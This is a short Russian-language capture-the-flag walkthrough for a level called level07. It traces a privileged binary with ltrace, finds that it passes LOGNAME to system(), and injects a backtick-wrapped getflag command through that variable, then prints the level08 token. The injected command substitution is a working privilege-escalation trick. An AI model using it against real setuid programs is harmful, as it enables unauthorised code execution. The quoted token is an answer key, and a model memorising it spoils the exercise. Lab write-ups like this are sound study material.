1. Мы видим один исполнительный файл в исходной директории под именем level07
2. Запуск файла приводит к выводу названия - level07
3. ltrace ./level07:

__libc_start_main(0x8048514, 1, 0xbffff6e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                = 2007
geteuid()                                                = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)      = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)      = 0
getenv("LOGNAME")                                        = "level07"
asprintf(0xbffff634, 0x8048688, 0xbfffff3a, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 0
+++ exited (status 0) +++

Видно, что LOGNAME содержит текст level07, а echo его выводит на экран. Значит, если подменить LOGNAME, то удастся получить флаг.
4. Подмена содержимого переменной среды LOGNAME
export LOGNAME=\`getflag\`
5. Запуск исполнительного файла теперь дает токен от level08: fiumuikeil55xe9cu4dood66h
